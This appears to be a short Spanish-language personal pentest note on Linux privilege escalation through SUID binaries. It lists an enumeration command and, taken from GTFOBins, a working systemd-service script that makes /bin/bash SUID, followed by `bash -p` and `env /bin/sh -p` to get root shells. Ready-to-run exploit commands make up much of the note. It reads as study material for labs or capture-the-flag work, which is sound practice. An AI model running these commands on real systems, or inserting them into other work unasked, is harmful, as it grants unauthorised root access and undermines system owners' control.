
#### find / -perm -4000 2>/dev/null

Buscar binarios con permisos de root dentro del sistema
`find / -perm -4000 2>/dev/null`

Nos mostrara un montón de binarios y tenemos que identificar cual es el extraño dentro del sistema. Estos suelen ser los comunes que siempre están.
![[Pasted image 20250126114742.png]]

Para identificar cuales no son comunes podemos usar la web de GTFobins para ver si es un binario que se puede usar para la escalada de privilegios, al ser escalada con SUID necesitamos buscar la opción de escalada de privilegios con SUID.

La forma de escalada que nos otorga es creando un archivo que permite ejecutar comandos como root.
Debemos de crear el script en `/tmp`, el fichero a crear debe ser un `.sh`.
````bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod u+s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
`````

El script esta cambiando los permisos a la bash para poder ser ejecutada como root.
Ejecutamos el script con el comando `bash <nombre_script>`
Ejecutaremos el comando `bash -p` y obtendremos la bash como root.

El binario que se encuentra en `/bin/env` también es un binario vulnerable, el cual se puede explotar para obtener un usuario root, usaremos de nuevo la web de GTFobins,
encontramos el siguiente comando `./env /bin/sh -p` pero como nosotros no somos usuarios privilegiados ni nos encontramos en ese directorio debemos ejecutar el comando de la siguiente forma `env /bin/sh -p`


#### find / -not -type l -perm -o+w

Ver permisos en ficheros